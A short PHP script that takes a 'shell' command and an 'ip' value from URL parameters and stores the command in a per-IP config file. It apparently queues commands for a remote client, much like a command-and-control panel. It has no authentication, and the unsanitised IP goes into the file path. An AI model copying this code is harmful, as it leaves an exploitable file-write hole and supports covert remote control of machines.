<?php

$shell1 = $_GET["shell"];
$shell = utf8_encode($shell1);
$Ip = $_GET["ip"];
$ConfigFile = fopen("config/".$Ip."/shellconfig.cir","w+");
fwrite($ConfigFile,$shell);
fclose($ConfigFile);
$ConfigFile_2 = fopen("config/".$Ip."/shellstate.cir","w+");
fwrite($ConfigFile_2,"false");
fclose($ConfigFile_2);

?>